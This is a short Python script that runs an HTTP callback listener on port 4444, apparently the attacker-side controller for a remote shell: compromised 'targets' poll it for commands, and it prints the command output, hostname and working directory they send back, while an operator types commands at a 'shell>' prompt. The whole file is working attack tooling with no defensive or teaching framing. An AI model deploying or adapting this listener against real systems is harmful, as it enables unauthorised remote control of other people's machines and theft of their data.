#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from urllib.parse import unquote
import json

class Handler(BaseHTTPRequestHandler):
    cmd_to_send = ""
    
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        # Target is sending us command output
        if 'output' in params:
            output = params['output'][0]
            host = params.get('host', ['unknown'])[0]
            pwd = params.get('pwd', ['unknown'])[0]
            print(f"\n[+] {host}:{pwd}$ {params.get('cmd', [''])[0]}")
            print(output)
            print("\n" + "-"*40)
        
        # Target is polling for next command
        if 'poll' in params:
            if Handler.cmd_to_send:
                response = Handler.cmd_to_send
                Handler.cmd_to_send = ""
            else:
                response = "NOCOMMAND"
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(response.encode())
            return
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        pass

def interactive_input(server):
    import threading
    def input_thread():
        while True:
            try:
                cmd = input("shell> ")
                if cmd.lower() == 'exit':
                    break
                Handler.cmd_to_send = cmd
            except:
                break
    t = threading.Thread(target=input_thread, daemon=True)
    t.start()
    return t

if __name__ == '__main__':
    port = 4444
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"[*] HTTP callback listener on port {port}")
    print("[*] Type commands and press Enter to execute on target")
    print("[*] Type 'exit' to quit")
    print("="*50)
    
    interactive_input(server)
    server.serve_forever()
